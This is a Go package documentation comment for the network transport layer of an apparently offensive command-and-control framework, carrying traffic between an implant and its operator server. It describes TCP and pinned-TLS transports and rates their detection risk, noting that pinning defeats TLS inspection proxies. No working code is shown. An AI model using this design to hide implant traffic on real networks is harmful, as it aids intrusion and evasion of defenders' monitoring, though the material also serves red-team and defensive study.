// Package transport provides pluggable network transport implementations
// for C2 communication including plain TCP and TLS with certificate pinning.
//
// Platform: Cross-platform
// Detection: Medium -- TLS connections with self-signed certs may be flagged
// by network monitoring; certificate pinning defeats TLS inspection proxies.
//
// The Transport interface defines Connect, Read, Write, Close, and RemoteAddr
// methods. Two implementations are provided:
//   - TCP: plain TCP connections with configurable timeout
//   - TLS: TLS connections with optional client certificates,
//     InsecureSkipVerify, and SHA256 certificate fingerprint pinning
//
// The factory function New creates the appropriate transport from
// a Config struct based on the UseTLS flag.
//
// How it works: A C2 transport is the network layer that carries commands and
// responses between an implant and its operator server. The TCP transport
// opens a raw socket connection with a configurable dial timeout, suitable for
// internal networks or tunneled traffic. The TLS transport wraps TCP with
// encryption and optionally pins a specific server certificate fingerprint,
// which prevents TLS inspection proxies from intercepting the traffic even if
// they have a trusted CA certificate.
package transport
